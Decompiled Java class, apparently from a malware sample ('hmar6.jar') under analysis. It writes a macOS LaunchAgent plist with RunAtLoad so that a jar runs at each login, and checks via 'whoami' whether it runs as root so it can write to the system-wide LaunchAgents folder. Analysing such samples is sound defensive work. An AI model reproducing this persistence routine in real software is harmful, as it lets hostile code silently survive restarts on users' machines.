package b;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;

/* loaded from: hmar6.jar:b/c.class */
public final class c extends a {
    public c(String str, String str2, boolean z) {
        super(str, str2, z);
    }

    private static File b() {
        String property = System.getProperty("user.home");
        if (a.c.b().a() != a.c.WINDOWS && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root")) {
            property = "";
        }
        return new File(String.valueOf(property) + "/Library/LaunchAgents/");
    }

    @Override // b.a
    public final void a() {
        if (!b().exists()) {
            b().mkdirs();
        }
        PrintWriter printWriter = new PrintWriter(new FileWriter(new File(b(), String.valueOf(this.f27b) + ".plist"))); //f27b looks like its some form of username
        printWriter.println("<plist version=\"1.0\">");
        printWriter.println("<dict>");
        printWriter.println("\t<key>Label</key>");
        printWriter.println("\t<string>" + this.f27b + "</string>");
        printWriter.println("\t<key>ProgramArguments</key>");
        printWriter.println("\t<array>");
        if (this.f26a) {
            printWriter.println("\t\t<string>java</string>");
            printWriter.println("\t\t<string>-jar</string>");
        }
        printWriter.println("\t\t<string>" + this.c + "</string>");
        printWriter.println("\t</array>");
        printWriter.println("\t<key>RunAtLoad</key>");
        printWriter.println("\t<true/>");
        printWriter.println("</dict>");
        printWriter.println("</plist>");
        printWriter.close();
    }
}
